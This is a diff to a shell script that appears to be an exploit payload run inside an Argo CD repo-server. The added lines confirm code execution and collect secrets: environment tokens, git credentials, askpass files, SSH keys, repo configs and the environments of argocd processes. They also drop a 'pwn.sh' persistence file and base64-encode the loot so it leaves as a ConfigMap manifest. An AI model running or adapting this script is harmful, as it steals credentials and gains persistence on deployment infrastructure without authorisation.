@@ -1,17 +1,45 @@
 #!/bin/sh
 {
-echo "== id =="; id
-echo "== hostname =="; hostname
-echo "== VAULT_TOKEN =="; echo "$VAULT_TOKEN"
-echo "== AVP_TYPE =="; echo "$AVP_TYPE"
-echo "== env(sel) =="; env | grep -iE 'vault|avp|argo|git|token|secret'
-echo "== _argocd-repo =="; ls -la /tmp/_argocd-repo/ 2>/dev/null
-for d in /tmp/_argocd-repo/*/; do echo "== $d =="; ls "$d" 2>/dev/null | head -8; done
-echo "== mounts(noexec) =="; grep noexec /proc/mounts 2>/dev/null
-echo "== caps =="; grep Cap /proc/self/status
-echo "== uname =="; uname -a
+echo "=== RCE CONFIRMED ==="
+id
+hostname
+echo "=== ENV ==="
+env | grep -iE "vault|avp|argo|git|token|secret|credential"
+echo "=== HOME ==="
+ls -la /home/argocd/ 2>/dev/null
+echo "=== GIT CREDS SEARCH ==="
+find /tmp /home -name "*.git-credentials" -o -name "askpass*" -o -name "*.key" -o -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | head -20
+for f in $(find /tmp -name "askpass*" 2>/dev/null | head -5); do echo "ASKPASS: $f"; cat "$f" 2>/dev/null; done
+echo "=== GIT CONFIG ==="
+for d in /tmp/_argocd-repo/*/; do echo "--- $d"; cat "$d/.git/config" 2>/dev/null; done
+echo "=== ARGOCD CONFIG ==="
+ls -la /app/config/ 2>/dev/null
+cat /app/config/git.config 2>/dev/null
+echo "=== SSH KEYS ==="
+ls -la /home/argocd/.ssh/ 2>/dev/null
+cat /home/argocd/.ssh/*.pub 2>/dev/null
+echo "=== PROC CRED ==="
+for p in $(ls /proc 2>/dev/null | grep -E "^[0-9]+$"); do
+  exe=$(readlink /proc/$p/exe 2>/dev/null)
+  if echo "$exe" | grep -q argocd; then
+    echo "PID=$p EXE=$exe"
+    cat /proc/$p/environ 2>/dev/null | tr "\0" "\n" | grep -iE "git|cred|token|secret|key" | head -10
+  fi
+done
+echo "=== WRITE PERSIST ==="
+cat > /home/argocd/pwn.sh << "PWN"
+#!/bin/sh
+echo "apiVersion: v1"
+echo "kind: ConfigMap"
+echo "metadata:"
+echo "  name: pwn-marker"
+echo "data:"
+echo "  pwned: \"yes\""
+PWN
+chmod +x /home/argocd/pwn.sh
+echo "PWN-SH-WRITTEN"
 } > /tmp/.r 2>&1
-B=$(base64 /tmp/.r | tr -d '\n')
+B=$(base64 /tmp/.r | tr -d "\n")
 echo "apiVersion: v1"
 echo "kind: ConfigMap"
 echo "metadata:"
